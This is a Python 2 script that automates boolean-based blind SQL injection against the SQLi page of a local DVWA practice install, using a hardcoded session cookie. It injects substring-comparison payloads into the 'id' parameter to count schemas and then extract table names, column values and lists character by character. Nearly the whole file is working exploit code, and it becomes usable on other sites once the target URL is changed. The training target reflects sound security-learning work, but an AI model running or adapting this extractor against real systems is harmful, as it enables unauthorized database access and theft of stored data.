import requests
import argparse
import sys

alpha="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.,:;<>?|{}[]_-+@/\!~#$%^&*()"
i=1
j=[]
h=[1]
g=[]
k=1
word='1'
length=0
n=0


#------------------------------------------------------------SETUP  AREA------------------------------------------------------------------------------
#set URL to attack																																	 |
URL = 'http://localhost/DVWA/vulnerabilities/sqli_blind/'
#																																					 |
#set cookie for request																																 |
cookie = {'security':'low', 'PHPSESSID':'ekdkvnea1t7kmgravc12la67h4'}
#																																					 |
#set headers																																		 |
header={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Connection':'close','Cache-Control':'max-age=0'}
#																																					 |
#set up B to inject for colum's length		at #BBBBB																								 |
#																															  						 |
#setup parameters lower @@ beta						   at #PARAMS																					 |
#in case of changing request method please set it lower @@ beta																						 |
#																																					 |
#set up A kind of injection               at #AAAA																									 |
#-----------------------------------------------------------------------------------------------------------------------------------------------------


if len(sys.argv) < 2:
	sys.argv.append("-h")

parser = argparse.ArgumentParser()
parser.add_argument('<word/table or list>', help="Looking for word or table or list")
parser.add_argument('<id>', help="id of known user")
parser.add_argument("<colum or query>", help="colum's name or query in '' ")
parser.add_argument('<colum name>', nargs='?', help="if list then provide colum name")
args = parser.parse_args()

while n<=20 and length==0:
		#BBBBB
		B = """1' and (select count(distinct table_schema) from information_schema.tables where table_type = "base table")='"""+str(n)+"'-- "
		#PARAMS
		PARAM = {('id',B),('Submit','Submit')}
		
		r = requests.get(URL,params=PARAM,headers=header,cookies=cookie)

		if r.text.find('User ID exists in the database.') != -1:
			length=n
			break
		else:
			n=n+1
			
restart = str(sys.argv[1])
while restart == 'table':
	for char in alpha:
		#AAAAA
		A = str(sys.argv[2])+"' and substring(("+str(sys.argv[3])+" limit 1) ,"+str(i)+",1)='"+char+"'-- "
		#PARAMS
		PARAM = {('id',A),('Submit','Submit')}

		r = requests.get(URL,params=PARAM,headers=header,cookies=cookie)	
		if r.text.find('User ID exists in the database.') != -1 :
			j.append(char)
			i=i+1
			print "Character found! "+char
			restart = 'table'
			break
		if char == alpha[-1] and j[-1] != alpha[-1]:
			restart = -1
			print ''.join(j)
			break

restart = str(sys.argv[1])
while restart =='list':
	while restart == 'list' or restart =='2':
		for char in alpha:
			if word =='1':	
				#AAAAA			
				A = str(sys.argv[2])+"' and substring(("+ str(sys.argv[3])+" limit 1) ,"+str(i)+",1)='"+char+"'-- "
			elif word == '2':
				#AAAAA
				A = str(sys.argv[2])+"' and substring(("+ str(sys.argv[3])+" and "+str(sys.argv[4])+"> '"+''.join(h)+"' limit 1) ,"+str(i)+",1)='"+str(char)+"'-- "
			#PARAMS					
			PARAM = {('id',A),('Submit','Submit')}

			r = requests.get(URL,params=PARAM,headers=header,cookies=cookie)
			
			if r.text.find('User ID exists in the database.') != -1 :
				if i==1:
					j=[0]
				j.append(char)
				print "Character found!"+char
				i=i+1				
				restart = 'list'
				break
			
			if char == alpha[-1] and j[-1] != alpha[-1]:
				i=1
				h=j[1:]
				print ''.join(h)
				restart = '2'
				word = '2'
				g.append(' '+''.join(h))
				print "Word found! "+''.join(h)
				j=[0]				
				break
			elif len(g)==length and length != 0:
				restart = -1
				print "["+''.join(g)+"]"
				break

			
restart = str(sys.argv[1])
while restart == 'word':
	for char in alpha:
		#AAAAA
		A =str(sys.argv[2])+"' and substring("+ str(sys.argv[3])+" ,"+str(i)+",1)='"+char+"'-- "
		#PARAMS	
		PARAM = {('id',A),('Submit','Submit')}
		
		r = requests.get(URL,params=PARAM,headers=header,cookies=cookie)

		if r.text.find('User ID exists in the database.') != -1 :
			j.append(char)
			i=i+1
			print "Character found! "+char
			restart = 'word'
			break
		if char == alpha[-1] and j[i-2]!=alpha[-1]:
			restart = -1
			print ''.join(j)
			break


#beta testing----		
#print r.text
#print r.json
#----------------
